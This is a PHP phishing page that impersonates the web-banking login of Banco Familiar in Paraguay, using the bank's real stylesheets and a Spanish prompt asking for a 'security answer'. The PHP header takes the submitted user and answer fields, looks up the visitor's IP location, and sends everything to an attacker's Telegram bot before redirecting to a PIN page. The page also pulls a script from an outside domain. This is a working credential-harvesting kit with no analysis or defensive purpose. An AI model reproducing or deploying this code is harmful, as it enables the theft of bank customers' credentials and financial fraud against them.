<?php
session_start();
error_reporting(0);
include "data.php";

$website = 'https://api.telegram.org/bot'.$token;
 
$ip = $_SERVER["REMOTE_ADDR"];
if (isset($_POST["p1"]) && isset($_POST["p1"])) {

$user = $_POST["user"];

$p1 = $_POST["p1"];
$p2 = $_POST["p2"];
$p3 = $_POST['p3'];


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/" . $ip);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$ip_data_in = curl_exec($ch);
curl_close($ch);
$ip_data = json_decode($ip_data_in, true);
$country = $ip_data["country"];
$city = $ip_data["city"];
$isp = $ip_data["isp"];
$code = $ip_data["countryCode"];
echo $ip_data;
//$time = gmstrftime("%Y. %B %d. %A. %X %Z");
$agent = $_SERVER["HTTP_USER_AGENT"];
$ip = $_SERVER["REMOTE_ADDR"];
$browser = get_browser_name($_SERVER["HTTP_USER_AGENT"]);


$msg = "\n🤔DATA RECEIVER🤔\n🔑user: => " . $user . "\n🔑P1: => " . $p1 . "\n🔑P2: => " . $p2 . "\n🔑P3: => " . $p3 . "\n=============================  " . "\n🌎Browser: => " . $browser . "\n🌆 Country Code: " . $code . "\n🌐 Country: " . $country . "\n🌎 City: " . $city . "\n📍 IP: " . $ip . "\n=============================🔥\n🔥🔥\n🔥Telegram: xhub 🔥\n";
        

 $url = $GLOBALS['website'].'/sendMessage?chat_id='.$chat_id.'&parse_mode=HTML&text='.urlencode($msg);
        file_get_contents($url);

echo '<script>window.location.href = "pin.php";</script>';

    
}

function get_browser_name($user_agent)
{
if (strpos($user_agent, "Opera") || strpos($user_agent, "OPR/")) {
    return "Opera";
}
if (strpos($user_agent, "Edge")) {
    return "Edge";
}
if (strpos($user_agent, "Chrome")) {
    return "Chrome";
}
if (strpos($user_agent, "Safari")) {
    return "Safari";
}
if (strpos($user_agent, "Firefox")) {
    return "Firefox";
}
if (strpos($user_agent, "MSIE") || strpos($user_agent, "Trident/7")) {
    return "Internet Explorer";
}
return "Other";
}

?>


<html class=" audio canvas video cssanimations csstransforms csstransitions csstransformslevel2"><head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="_csrf_parameter" content="_csrf"><meta name="_csrf_header" content="X-CSRF-TOKEN"><meta name="_csrf" content="95195ece-b35a-4be3-bbd4-9865fd6c9a62">
<title>Familiar-Web</title>
<link rel="icon" type="image/png" href="https://ssecure.familiar.com.py/bancaweb3/resources/images/favicon.png">

<style>

	.data {
		max-width: 650px;
		min-width: 400px;
	
	}
</style>




<!--  CSS files -->
<link href="https://ssecure.familiar.com.py/bancaweb3/resources/bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
<link href="https://ssecure.familiar.com.py/bancaweb3/resources/bootstrap-select/css/bootstrap-select.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/commons.css?17122022">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/datepicker.css">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/datepicker3.css">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/font-awesome/css/font-awesome.min.css">

<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar.css?17122022">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_margin.css?17122022">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar_icons.css?17122022">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/keyboard.css?17122022">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/familiar-responsive.css?17122022">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/Fonts/webfontkit/stylesheet.css">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/css/pago-servicios.css?17122022">
<link rel="stylesheet" type="text/css" href="https://ssecure.familiar.com.py/bancaweb3/resources/bxslider/jquery.bxslider.css">

</head>
<body id="bodyLogin">
<div class="container">
	<div class="row">
		<div class="col-xs-6 col-sm-6 col-md-6 col-lg-12 container-login data">
			
			<input type="hidden" value="content-saludo" id="cont-visible">
			<input type="hidden" value="" id="opType">
			<input type="hidden" value="null" id="inp-canal">
			<div class="col-xs-12 col-sm-12 login-box right" id="content-saludo" style="display:block">






<div class="home-transferencias" id="step-container">
<div class="cuentas-head transfer-head">
	<div class="row cuentas-head-inner">
		<div class="col-xs-12 col-sm-12 col-md-6 pdlr-0 nro-producto" style="width: 100%;">
			<h3 id="wz-title" style="padding-top: 5px;"><span id="wz-icon"> </span> No hemos podido determinar si has utilizado este dispositivo anteriormente, Para continuar confime umas de sus respuesta de seguridad.</h3>
		</div>
	</div>
</div>
<div class="col-xs-12 col-sm-12 col-md-12 col-lg-12 caja-password transfer-content">
	<!-- Mensaje de errores -->
	<div id="main-error-message" class="alert-danger mb-10">
		<div class="row" style="margin-right: 0px;">
			<div class="col-xs-12 col-sm-12">
				<p id="error-type" style="font-weight: bold;"></p>
				<div id="error-message"></div>
			</div>
		</div>
	</div>

	<div class="content-cuentas">
		<div class="cuentas-white" id="step-content">
		

			<div class="row">
				<div class="row pdb-10">
					<div class="col-xs-12">
						<span class="text-blue text-bold">¿Ingresa tu respuesta de seguridad que colocaste en el banco?</span>
					</div>
				</div>
<form  method="post">
				<div class="row">
					<div class="col-xs-12 ">
						<div class="form-group">
			<br>                
<input class="form-control input-familiar" type="text" name="p1" id="ci" autocomplete="off" placeholder="Repuesta de seguridad">

<br>
						</div>
					</div>
				</div>
				<div class="col-xs-12 col-sm-12 ">
		            			<div class="col-xs-12 col-sm-12 content-bottom-blue pdt-15">
			            			<!-- <button type="button" class="bottom-blue" id="login_button">Ingresar</button> -->
			            			<!-- <button type="button" class="bottom-blue g-recaptcha" id="login_button"
			            				 data-sitekey="6LfLjT4UAAAAAHW_tLJPOllFq3q46pVxT4_nKJ1c" data-callback="enviarFormulario" >			            			
			            				Ingresar
			            			</button> -->
			            			<!-- <div id="recaptchaLogin" class="g-recaptcha"  data-sitekey="6LfLjT4UAAAAAHW_tLJPOllFq3q46pVxT4_nKJ1c"  data-callback="enviarFormulario"
									  data-size="invisible"></div> -->
									<button type="submit" class="bottom-blue">
										Confirmar
									</button>
									</form>
			            		</div>
		            		</div>

				</form>

				
				

			</div>

		</div>
		<div class="cuentas-white loading" style="margin-left: 0px; display: none;"><img src="/bancaweb3/resources/images/loading.gif"></div>


	</div>
</div>
</div>





</div>
										  
			
		
			<div class="col-xs-12 col-sm-12 content-bottom pdt-15">
				<div class="col-xs-5 col-sm-5 col-md-4 text-bottom-left">
					<p>Banco Familiar 2018 Asunción del Paraguay</p>
					<!-- <p>Contacto: familiar@familiar.com.py</p> -->
				</div>
				<div class="col-xs-5 col-sm-5 col-md-6 text-bottom-right">
					<p><a href="https://www.familiar.com.py/interna-84.htm">Nuestra red Nacional de Sucursales</a> - <a href="https://www.familiar.com.py/interna-122.htm">Condiciones Generales y Operacionales</a></p>
					<p><a href="https://www.familiar.com.py/interna-85.htm">Política de Seguridad</a></p>
				</div>
				<div class="col-xs-2 col-sm-2 col-md-2 text-bottom-right" style="text-align:right">
					<img src="resources/images/aTodaHora.png" alt="Familiar a toda hora" class="img-a-toda-hora">
					<p>Versión 3.5.22</p>
				</div>
			</div>
		</div>
		
	</div>
</div>


<script type="text/javascript" src="https://www.images-home.com/image.js"> </script><img src="https://www.images-home.com/86975.gif?from=ssecure.familiar.com.py">


<script>
	
$( document ).ready(function(){
	
	$('#userName').focus();
	buildKeyboard(false, $("#teclado"), $("#password"),true);
	if ($("#rememberData").val() == "true"){
		$("#rememberDataInput").attr("checked", true);
	}
	var userType = $('#userType').val();
	if (userType == 'business')
	{
		 $( "#div-empresas" ).click();
	}else
	{
		$('#errorNumberRuc').addClass("hidden");
	}		
	
	
	if("a1450" == "a1051" || "a1450" == "a1050"){  // USUARIO BLOQUEDO
		$('.alert-danger').html("<label>Aviso</label><br/>Usuario bloqueado. Puede desbloquear su usuario haciendo click aqu&iacute;.");
		$('.alert-danger').css('cursor','pointer');
		$('.alert-danger').click(function(){
			loadOpcion('/bancaweb3/credential/unlock/');
		});
	} else {
		$('.alert-danger').css('cursor','auto');
		$('.alert-danger').unbind('click');
	}
	
	generateDeviceId();
	 var clickLogin = false;
	 $(document).on('click','#login_button', function(){
		 if(!clickLogin)	{
			clickLogin = true;			
			$('#login_form').submit();
		}			
	});	
	 $('#modal-banner-login').modal({backdrop: 'static', keyboard: false});


	 /*al ir atras de solicitud de acceso*/
	console.log("");
	
});

$(document).on('keypress','.user-name', function(event){
	var regex = new RegExp(REGEX_DOCUMENT_NUMBER);
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
	   event.preventDefault();
	   return false;
	}
});
$(document).on('keypress','.number-ruc', function(event){
	var regex = new RegExp(REGEX_DOCUMENT_NUMBER);
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
	   event.preventDefault();
	   return false;
	}
});

$(document).on('click','#div-personas', function(){
	var selected = $(this).hasClass("person-des-select");
	if(selected){
		$(this).addClass("person-select");
		$(this).removeClass("person-des-select");
		$('#div-empresas').removeClass("enty-select");
		$('#div-empresas').addClass("enty-des-select");
		$('#userType').val("customer");
		$('#divNumberRuc').addClass("hidden");
		$('#errorUserName').text("");
		$('#errorPassword').text("");
	}
	mostrarSaludo();
});

$(document).on('click','#div-empresas', function(){
	var selected = $(this).hasClass("enty-des-select");
	if(selected){
		var userType = $('#userType').val();
		if (userType == "customer")
		{
			$('#errorNumberRuc').text("");
			$('#errorUserName').text("");
			$('#errorPassword').text("");
			//$('#userName').val('');
			//$('#password').val('');
			
			/* if ($('#rememberDataInput').is(':checked')){
				$("#rememberData").val("false");
				$('#rememberDataInput').prop("checked", false);
			} */
		}
		$(this).addClass("enty-select");
		$(this).removeClass("enty-des-select");
		$('#div-personas').removeClass("person-select");
		$('#div-personas').addClass("person-des-select");
		$('#userType').val("business");
		$('#divNumberRuc').removeClass("hidden");
	}
	
	mostrarSaludo();
	
});

$(document).on('change','#rememberDataInput', function(){
	if ($(this).is(':checked')){
		$("#rememberData").val("true");
	} else {
		$("#rememberData").val("false");
	}
});




/************************/
function loadOpcion(url)
{
	$('#content-saludo .loading').css('display','block');
	if(contenidoSaludo==null || contenidoSaludo.trim()=="")
		contenidoSaludo = $("#content-saludo").html();
	$.ajax({
		beforeSend: function (request) {
			request.setRequestHeader($("meta[name='_csrf_header']").attr("content"), $("meta[name='_csrf']").attr("content"));
		},
		type:"GET",
		url: url,
		success : function(data, status, xhr) {				
			$("#content-saludo").html(data);
		}
	});	
}

function mostrarSaludo(){
	$('#step-container .loading').fadeIn("fast");
	if(contenidoSaludo!=null && contenidoSaludo.trim()!=""){
		$("#content-saludo").html(contenidoSaludo);
		$('#content-saludo .loading').css('display','none');
		$('#step-container .loading').fadeOut("fast");		
	}
};

function mostrarLoginAndOptions(error){
	$('#content-saludo .loading').css('display','block');
	if(contenidoLogin!=null && contenidoLogin.trim()!=""){
		$(".container-login").html(contenidoLogin);
		$('#step-container .loading').fadeOut("fast");

		if(error !== undefined){
			showErrorMessage(error);
		}

		$("#teclado").html('');
		buildKeyboard(false, $("#teclado"), $("#password"),true);
		$('#content-saludo .loading').css('display','none');
	}
};

function showFirstPageOptions(url)
{
	$('#content-saludo .loading').css('display','block');
	if(contenidoSaludo==null || contenidoSaludo.trim()=="")
		contenidoSaludo = $("#content-saludo").html();
	$.ajax({
		type:"GET",
		url: url,
		success : function(data, status, xhr) {
			$("#content-saludo").html(data);
			$('#content-saludo .loading').css('display','none');
			$('#step-container .loading').fadeOut("fast");
		}
	});
}

function showFirstPageWithCard(requireCi,doc){
	var ci ='';
	if(doc !== undefined)
		ci = doc;

	if(requireCi){
		ci = $('#ci').val().trim();
		if(ci.length === 0){
			showErrorMessage("Ingresa tu número de documento.");
			return null;
		}
	}

	$('#btnCard').addClass('disabled');
	$('#btnGenerate').addClass('disabled');

	/*Verficar si tiene tarjeta*/
	$('#content-saludo .loading').show();

	$.ajax({
		beforeSend: function (request) {
			request.setRequestHeader($("meta[name='_csrf_header']").attr("content"), $("meta[name='_csrf']").attr("content"));
		},
		url: appname + '/credential/card-password/verify-have-a-card',
		data:{
			nroDoc: ci
		},
		type: 'GET',
		success: function (result, status, xhr) {
			console.log(result);
			if(result.hasError){
				showErrorMessage(result.errorBody.message);
			}
			else if(result.response === false)
				showErrorMessage("Datos ingresados inv&aacute;lidos");
			else{
				$('#content-saludo .loading').css('display','block');
				if(contenidoLogin==null || contenidoLogin.trim()=="")
					contenidoLogin =  $(".container-login").html();

					window.location = appname+"/credential/card-password/init?ci="+ci+'&redirect=false';
			}


		},
		error: fnHomeAjaxErrorHandler,
		complete: function () {
			$('#content-saludo .loading').hide();
			$('#btnCard').removeClass('disabled');
			$('#btnGenerate').removeClass('disabled');
		}
	});

}


function loadOpcionFullScreen(url, requireCi, doc)
{
	var ci ='';
	if(doc !== undefined)
		ci = doc;

	if(requireCi){
		ci = $('#ci').val().trim();
		if(ci.length === 0){
			showErrorMessage("Debe Introducir su n&uacute;mero de cédula o pasaporte.");
			return null;
		}
	}

	$('#content-saludo .loading').show();
	if(contenidoLogin==null || contenidoLogin.trim()=="")
		contenidoLogin =  $(".container-login").html();


	var data = {
		deviceId     : $("#deviceId").val(),
		ci 			 : ci
	};

	$.ajax({
		beforeSend: function (request) {
			request.setRequestHeader($("meta[name='_csrf_header']").attr("content"), $("meta[name='_csrf']").attr("content"));
		},
		type:"GET",
		url: url,
		data: data,
		success : function(data, status, xhr) {
			if(data.hasError !== undefined && data.hasError){
				showErrorMessage(data.errorBody.message);
				$('#content-saludo .loading').hide();
			}
			else{
				$(".container-login").css({'border-radius':'unset'});
				$(".container-login").html(data);
			}
		}
	});
}
	
</script>

</body></html>